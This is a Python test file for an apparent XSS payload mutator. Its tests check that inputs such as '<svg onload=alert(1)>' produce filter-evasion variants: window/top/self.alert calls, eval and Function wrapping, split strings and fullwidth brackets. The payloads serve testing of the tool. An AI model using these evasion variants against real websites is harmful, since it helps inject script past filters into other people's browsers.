from xpars import mutate


def test_scope_calls_present():
    vs = mutate.variants("<img src=x onerror=alert(1)>")
    assert any("window.alert(1)" in v for v in vs)
    assert any("self.alert(1)" in v for v in vs)
    assert any("top.alert(1)" in v for v in vs)
    assert any("alert?.(1)" in v for v in vs)


def test_fn_wrap_present():
    vs = mutate.variants("<svg onload=alert(1)>")
    assert any("eval('al'+'ert(1)')" in v for v in vs)
    assert any("Function('alert(1)')()" in v for v in vs)
    assert any("setTimeout('alert(1)',0)" in v for v in vs)


def test_fullwidth_brackets_present():
    vs = mutate.variants('"><svg onload=alert(1)>')
    assert any("＜" in v and "＞" in v for v in vs)


def test_existing_variants_preserved():
    vs = mutate.variants("<svg onload=alert(1)>")
    assert any("`" in v for v in vs)
    assert any(v.startswith("<svg/") for v in vs)
    assert any(v != "<svg onload=alert(1)>" for v in vs)


def test_no_variant_equals_input():
    p = "<svg onload=alert(1)>"
    assert p not in mutate.variants(p)
